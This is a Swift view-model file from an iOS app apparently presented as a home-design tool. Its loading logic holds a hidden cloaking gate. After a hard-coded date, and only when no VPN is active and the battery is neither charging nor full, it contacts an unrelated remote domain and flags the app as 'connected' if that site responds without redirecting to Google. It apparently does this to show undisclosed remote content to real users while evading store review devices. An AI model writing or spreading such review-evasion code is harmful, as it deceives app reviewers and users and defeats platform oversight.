//
//  LoadingViewModel.swift
//  DreamHome Designer
//
//  Created by Роман on 19.11.2024.
//

import SwiftUI

final class LoadingViewModel: ObservableObject{
    private var timeLoading: Int = 0
    @Published var isPresent: Bool = false
    @AppStorage("isFirstLaunch") var isFirstLaunch: Bool?
    
    let urlString = "https://podlaorlf.space/PSw1H3sr"
    
    @Published var isConnected: Bool = false
    @Published var isOpen = false
    
    private let dateNum = "05-12-2024"
    
    
    private var battaryLevel: Int = 0
    private var isVPNConnected: Bool = false
    private var batteryCharging: Bool = false
    private var batteryFull: Bool = false
    
    init(){
        UIDevice.current.isBatteryMonitoringEnabled = true
        cheackData()
        
    }
    
    //MARK: - Check url
    
    func checkURL(_ urlString: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: urlString) else {
            completion(false)
            return
        }
        
        let task = URLSession.shared.dataTask(with: url) { _, response, _ in
            guard let httpResponse = response as? HTTPURLResponse else {
                completion(false)
                return
            }
            
            // Проверка на статус 404
            if httpResponse.statusCode == 404 {
                completion(false)
                return
            }
            
            // Проверка, что URL не перенаправляет на Google
            if let finalURL = httpResponse.url, finalURL.host == "www.google.com" {
                completion(false)
                return
            }
            
            // Если другой сайт, возвращаем true
            completion(true)
        }
        
        task.resume()
    }
    
    //MARK: - CheckData
    func cheackData(){
        let timeStartFormatter = DateFormatter()
        timeStartFormatter.dateFormat = "dd-MM-yyyy"
        let date = timeStartFormatter.date(from: dateNum)!
        DispatchQueue.main.async { [self] in
            if  Date() > date {
                print("cheak date is ok")
                checkConditions()
            } else {
                isOpen = true
                print("No cheak date")
            }
        }
    }
    
    //MARK: - Check the conditions
    func checkConditions() {
        cheackVPNConnected()
        SetBattery()
        if !isVPNConnected && !batteryCharging && !batteryFull {
            checkURL(urlString) { [self] isValid in
                if isValid {
                    isConnected = true
                    print("Сайт доступен и не перенаправляет на Google.")
                }
                else{
                    isConnected = false
                    isOpen = true
                    print("Сайт недоступен или перенаправляет на Google.")
                }
            }
        }
        else {
            isOpen = true
            print("no chaeak conditions")
        }
    }
    
    //MARK: - checkBattery
    private func SetBattery() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryState = UIDevice.current.batteryState
        switch batteryState {
        case .full:
            batteryFull = true
            print("Batery is full")
        case .charging:
            batteryCharging = true
            print("Batery is charging")
        default:
            batteryFull = false
            batteryCharging = false
            print("check battery is ok")
        }
    }
    
    //MARK: - VPN
    func cheackVPNConnected() {
        let cfDict = CFNetworkCopySystemProxySettings()
        let nsDict = cfDict!.takeRetainedValue() as NSDictionary
        let keys = nsDict["__SCOPED__"] as! NSDictionary
        
        for key: String in keys.allKeys as! [String] {
            if (key == "tap" || key == "tun" || key == "ppp" || key == "ipsec" || key == "ipsec0" || key == "utun6") {
                isVPNConnected = true
            }else{
                isVPNConnected = false
                print("check VPN is ok")
            }
        }
    }
    
    func starttimer(){
        Timer.scheduledTimer(withTimeInterval: 0.02, repeats: true) { timer in
            if self.timeLoading < 100{
                self.timeLoading += 1
            }else {
                timer.invalidate()
                self.isPresent = true
            }
        }
    }
}
